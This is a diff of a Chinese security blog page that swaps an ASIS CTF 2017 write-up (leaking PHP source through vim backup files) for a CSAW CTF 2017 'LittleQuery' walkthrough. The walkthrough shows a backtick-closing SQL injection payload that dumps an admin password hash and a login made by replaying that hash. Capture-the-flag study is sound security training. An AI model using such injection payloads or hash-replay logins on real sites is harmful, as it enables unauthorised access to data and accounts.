@@ -89,21 +89,28 @@
 
 
 
-<meta name="description" content="Task12345678Description:global security agency main server, it interacts with several GSA&amp;apos;s servers. Try to find some holes, and you will be rewarded a flag.Host: gsa.mainServer.domainScope: 178.">
+<meta name="description" content="CSAW CTF 2017-LittleQuery-writeupSQL注入漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ASISCTF2017-GSA Main Server-writeup">
-<meta property="og:url" content="http://chybeta.github.io/2017/09/13/ASISCTF2017-GSA-Main-Server-writeup/index.html">
+<meta property="og:title" content="CSAW CTF 2017-LittleQuery-writeup">
+<meta property="og:url" content="http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-LittleQuery-writeup/index.html">
 <meta property="og:site_name" content="Chybeta">
-<meta property="og:description" content="Task12345678Description:global security agency main server, it interacts with several GSA&amp;apos;s servers. Try to find some holes, and you will be rewarded a flag.Host: gsa.mainServer.domainScope: 178.">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170913/1.png?raw=true">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170913/4.png?raw=true">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170913/2.png?raw=true">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170913/3.png?raw=true">
-<meta property="og:updated_time" content="2017-09-13T12:30:59.669Z">
+<meta property="og:description" content="CSAW CTF 2017-LittleQuery-writeupSQL注入漏洞">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/21.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/12.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/13.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/15.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/14.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/16.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/17.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/18.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/20.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/22.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/23.png?raw=true">
+<meta property="og:updated_time" content="2017-09-18T13:34:08.236Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ASISCTF2017-GSA Main Server-writeup">
-<meta name="twitter:description" content="Task12345678Description:global security agency main server, it interacts with several GSA&amp;apos;s servers. Try to find some holes, and you will be rewarded a flag.Host: gsa.mainServer.domainScope: 178.">
-<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170913/1.png?raw=true">
+<meta name="twitter:title" content="CSAW CTF 2017-LittleQuery-writeup">
+<meta name="twitter:description" content="CSAW CTF 2017-LittleQuery-writeupSQL注入漏洞">
+<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/21.png?raw=true">
 
 
 
@@ -131,13 +138,13 @@
 
 
 
-  <link rel="canonical" href="http://chybeta.github.io/2017/09/13/ASISCTF2017-GSA-Main-Server-writeup/"/>
+  <link rel="canonical" href="http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-LittleQuery-writeup/"/>
 
 
 
 
 
-  <title> ASISCTF2017-GSA Main Server-writeup | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <title> CSAW CTF 2017-LittleQuery-writeup | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -303,7 +310,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2017/09/13/ASISCTF2017-GSA-Main-Server-writeup/">
+  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-LittleQuery-writeup/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="chybeta">
@@ -327,7 +334,7 @@
             
             
               
-                ASISCTF2017-GSA Main Server-writeup
+                CSAW CTF 2017-LittleQuery-writeup
               
             
           </h1>
@@ -342,8 +349,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-13T19:36:51+08:00">
-                2017-09-13
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-18T13:50:36+08:00">
+                2017-09-18
               </time>
             
 
@@ -384,7 +391,7 @@
 
           
           
-             <span id="/2017/09/13/ASISCTF2017-GSA-Main-Server-writeup/" class="leancloud_visitors" data-flag-title="ASISCTF2017-GSA Main Server-writeup">
+             <span id="/2017/09/18/CSAW-CTF-2017-LittleQuery-writeup/" class="leancloud_visitors" data-flag-title="CSAW CTF 2017-LittleQuery-writeup">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -411,13 +418,25 @@
       
 
       
-        <h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Description:</div><div class="line"></div><div class="line">global security agency main server, it interacts with several GSA&apos;s servers. Try to find some holes, and you will be rewarded a flag.</div><div class="line"></div><div class="line">Host: gsa.mainServer.domain</div><div class="line">Scope: 178.62.34.76:*</div><div class="line"></div><div class="line">Hint: Forget the XSS</div></pre></td></tr></table></figure>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170913/1.png?raw=true" alt=""></p>
-<p>打开 178.62.34.76:80 后界面如上。</p>
-<p>看一下功能，在 <a href="http://178.62.34.76/showInformation/2" target="_blank" rel="external">http://178.62.34.76/showInformation/2</a> 底下有一个<code>Get Attachment</code>，点击后会发送一个请求，请求头部中带有X-Signature字段，应该是用来作为请求文件 /getAttachment/file.txt 的认证，防止任意下载：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170913/4.png?raw=true" alt=""></p>
-<p>查看index.php的源代码，最底下有一句注释：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--# vim: syntax=apache ts=4 sw=4 sts=4 sr noet--&gt;</div></pre></td></tr></table></figure></p>
-<p>vim编辑器默认情况下，在修改文件后系统会自动生成如<code>index.php~</code>的备份文件。若是不正常情况退出，会产生如<code>.index.php.swp</code>，<code>.index.php.swo</code>或<code>.index.php.swn</code>的临时文件。尝试访问：<a href="http://178.62.34.76/index.php~" target="_blank" rel="external">http://178.62.34.76/index.php~</a> ，并查看源代码，有一些php代码出现：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170913/2.png?raw=true" alt=""><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170913/3.png?raw=true" alt=""></p>
-<p>经过测试，访问：<a href="http://178.62.34.76/functions.php~" target="_blank" rel="external">http://178.62.34.76/functions.php~</a> 得到：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="comment">// database configuration</span></div><div class="line"><span class="keyword">include</span> <span class="string">'configuration.php'</span>;</div><div class="line"></div><div class="line"><span class="comment">// waf to protect the web attacks</span></div><div class="line"><span class="keyword">include</span> <span class="string">'waf.php'</span>;</div><div class="line"></div><div class="line"><span class="comment">// connection to the database</span></div><div class="line">$mysqli = <span class="keyword">new</span> mysqli(__DB_HOST, __DB_USER, __DB_PASS, __DB_NAME);</div><div class="line"></div><div class="line"><span class="comment">// signature function</span></div><div class="line"><span class="comment">// store __KEY in safe place</span></div><div class="line"><span class="comment">// __KEY is stored in configuration.php</span></div><div class="line"><span class="comment">// do not change the __KEY if you don't know how the system workes, the installation process produces secure 10-chacacter key</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeSignature</span><span class="params">($fileName)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> md5(md5(__KEY) . $fileName);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// function to get header data by HTTP packet</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getHeaderData</span><span class="params">($headers, $name)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> (array_key_exists($name, $headers))?$headers[$name]:<span class="keyword">false</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// parsing the database resultst</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">resultToArray</span><span class="params">($result)</span></span>&#123;</div><div class="line">    $rows = <span class="keyword">array</span>();</div><div class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</div><div class="line">        $rows[] = $row;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $rows;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// end</span></div></pre></td></tr></table></figure></p>
+        <p>CSAW CTF 2017-LittleQuery-writeup<br>SQL注入漏洞<br><a id="more"></a></p>
+<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">LittleQuery</div><div class="line">I&apos;ve got a new website for BIG DATA analytics!</div><div class="line">http://littlequery.chal.csaw.io</div></pre></td></tr></table></figure>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>先看看功能.<br>有一个登陆点: <a href="http://littlequery.chal.csaw.io/login.php" target="_blank" rel="external">http://littlequery.chal.csaw.io/login.php</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/21.png?raw=true" alt=""></p>
+<p>有一些敏感目录：<a href="http://littlequery.chal.csaw.io/js/" target="_blank" rel="external">http://littlequery.chal.csaw.io/js/</a><br>其中login.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">".form-signin"</span>).submit(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> $password = $(<span class="keyword">this</span>).find(<span class="string">"input[type=password]"</span>);</div><div class="line">    $password.val(CryptoJS.SHA1($password.val()).toString());</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
+<p>query.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> codeMirror = CodeMirror.fromTextArea(<span class="built_in">document</span>.getElementById(<span class="string">'editor'</span>), &#123;</div><div class="line">	<span class="attr">lineNumbers</span>: <span class="literal">true</span>,</div><div class="line">	<span class="attr">matchBrackets</span>: <span class="literal">true</span>,</div><div class="line">	<span class="attr">mode</span>: <span class="string">'javascript'</span>,</div><div class="line">&#125;);</div><div class="line"></div><div class="line">$(<span class="string">'#submit'</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    $(<span class="string">'#submit'</span>).addClass(<span class="string">'disabled'</span>);</div><div class="line">    $(<span class="string">'#spinner'</span>).removeClass(<span class="string">'invisible'</span>);</div><div class="line">    $(<span class="string">'#output'</span>).text(<span class="string">''</span>);</div><div class="line">    $.post(<span class="string">'/query.php'</span>,</div><div class="line">           &#123;</div><div class="line">               <span class="string">'code'</span>: codeMirror.getValue(),</div><div class="line">           &#125;,</div><div class="line">           <span class="function"><span class="keyword">function</span> (<span class="params">output</span>) </span>&#123;</div><div class="line">               $(<span class="string">'#output'</span>).text(output);</div><div class="line">               $(<span class="string">'#submit'</span>).removeClass(<span class="string">'disabled'</span>);</div><div class="line">               $(<span class="string">'#spinner'</span>).addClass(<span class="string">'invisible'</span>);</div><div class="line">           &#125;</div><div class="line">    );</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
+<p>查看源代码，发现有注释：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/12.png?raw=true" alt=""></p>
+<p>同时由robots.txt，也能发现该页面： <a href="http://littlequery.chal.csaw.io/api/db_explore.php" target="_blank" rel="external">http://littlequery.chal.csaw.io/api/db_explore.php</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/13.png?raw=true" alt=""></p>
+<p>若要preview ，会要求提供<code>db</code>和<code>table</code>参数。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/15.png?raw=true" alt=""></p>
+<p>所以先一步一步的“schema”。<br><a href="http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema" target="_blank" rel="external">http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/14.png?raw=true" alt=""></p>
+<p><a href="http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&amp;db=littlequery" target="_blank" rel="external">http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&amp;db=littlequery</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/16.png?raw=true" alt=""></p>
+<p><a href="http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&amp;db=littlequery&amp;table=user" target="_blank" rel="external">http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&amp;db=littlequery&amp;table=user</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/17.png?raw=true" alt=""></p>
+<p>db和table都知道了，接着尝试一下preview： <a href="http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&amp;db=littlequery&amp;table=user" target="_blank" rel="external">http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&amp;db=littlequery&amp;table=user</a></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/18.png?raw=true" alt=""></p>
+<p>不能直接显示。考虑到这是数据库的操作，可能会存在sql注入漏洞。尝试访问：<a href="http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&amp;db=littlequery&#39;&amp;table=user" target="_blank" rel="external">http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&amp;db=littlequery&#39;&amp;table=user</a>‘</p>
+<p>可以看到单引号被加上了斜杠，同时知道是用反引号闭合的。根据上面两次操作，我们推测服务器后端大概是这样写的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">...</div><div class="line">$mode = $_GET[<span class="string">'mode'</span>];</div><div class="line">$db = <span class="keyword">isset</span>($_GET[<span class="string">'db'</span>])? addslashes($_GET[<span class="string">'db'</span>]):<span class="string">''</span>;</div><div class="line">$table = <span class="keyword">isset</span>($_GET[<span class="string">'table'</span>])? addslashes($_GET[<span class="string">'table'</span>]):<span class="string">''</span>;</div><div class="line"><span class="keyword">if</span> ($mode == <span class="string">'preview'</span>)&#123;</div><div class="line">	<span class="keyword">if</span> ($db &amp;&amp; $table)&#123;</div><div class="line">		<span class="keyword">if</span> ($db === <span class="string">'littlequery'</span>)</div><div class="line">			<span class="keyword">die</span>(<span class="string">"Database 'littlequery' is not allowed to be previewed."</span>);</div><div class="line">		$sql = <span class="string">"select * from `$db`.`$table`"</span>;</div><div class="line">		db-&gt;query($sql);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"Must provide db and table to preview data"</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">...</div></pre></td></tr></table></figure></p>
+<p>目的是要查出 littlequery.user 中的数据，所以利用反引号闭合，传入的<code>db</code>参数为：<code>littlequery`.`user`%23</code>。<code>table</code>参数随意，比如字母a。则传入后构造出来的sql语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from `littlequery`.`user`%23`.`a`</div></pre></td></tr></table></figure></p>
+<p>则在<code>%23</code>后的将会被注释掉，同时又能过掉服务器端关于<code>$db === &#39;littlequery&#39;</code>的检测。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/20.png?raw=true" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[&#123;&quot;uid&quot;:&quot;1&quot;,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;5896e92d38ee883cc09ad6f88df4934f6b074cf8&quot;&#125;]</div></pre></td></tr></table></figure></p>
+<p>回到 <a href="http://littlequery.chal.csaw.io/login.php" target="_blank" rel="external">http://littlequery.chal.csaw.io/login.php</a> ，直接登陆失败。看一下前面的login.js，会先把输入的密码进行一次<code>CryptoJS.SHA1</code>加密后再发送。而我们注出来的密码应该是原密码经过<code>CryptoJS.SHA1</code>加密后的结果，应该所以应该先抓包，修改password为”5896…”<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/22.png?raw=true" alt=""></p>
+<p>出现了302跳转，follow：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/23.png?raw=true" alt=""></p>
 
       
     </div>
@@ -430,12 +449,12 @@
   <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
-  <p><span>本文标题:</span><a href="/2017/09/13/ASISCTF2017-GSA-Main-Server-writeup/">ASISCTF2017-GSA Main Server-writeup</a></p>
+  <p><span>本文标题:</span><a href="/2017/09/18/CSAW-CTF-2017-LittleQuery-writeup/">CSAW CTF 2017-LittleQuery-writeup</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
-  <p><span>发布时间:</span>2017年09月13日 - 19:09</p>
-  <p><span>最后更新:</span>2017年09月13日 - 20:09</p>
-  <p><span>原始链接:</span><a href="/2017/09/13/ASISCTF2017-GSA-Main-Server-writeup/" title="ASISCTF2017-GSA Main Server-writeup">http://chybeta.github.io/2017/09/13/ASISCTF2017-GSA-Main-Server-writeup/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://chybeta.github.io/2017/09/13/ASISCTF2017-GSA-Main-Server-writeup/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2017年09月18日 - 13:09</p>
+  <p><span>最后更新:</span>2017年09月18日 - 21:09</p>
+  <p><span>原始链接:</span><a href="/2017/09/18/CSAW-CTF-2017-LittleQuery-writeup/" title="CSAW CTF 2017-LittleQuery-writeup">http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-LittleQuery-writeup/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-LittleQuery-writeup/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
 </div>
@@ -505,8 +524,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/09/12/ICMSv7-0-1-admincp-class-php-sql注入分析/" rel="next" title="ICMSv7.0.1 admincp.class.php sql注入分析">
-                <i class="fa fa-chevron-left"></i> ICMSv7.0.1 admincp.class.php sql注入分析
+              <a href="/2017/09/18/CSAW-CTF-2017-Shia-Labeouf-off-writeup/" rel="next" title="CSAW CTF 2017-Shia Labeouf-off-writeup">
+                <i class="fa fa-chevron-left"></i> CSAW CTF 2017-Shia Labeouf-off-writeup
               </a>
             
           </div>
@@ -515,8 +534,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/09/14/SEC-T-CTF2017-Sprinkler-system-writeup/" rel="prev" title="SEC-T CTF2017-Sprinkler system-writeup">
-                SEC-T CTF2017-Sprinkler system-writeup <i class="fa fa-chevron-right"></i>
+              <a href="/3017/07/26/一些文章/" rel="prev" title="一些文章">
+                一些文章 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -589,7 +608,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">129</span>
+                <span class="site-state-item-count">132</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
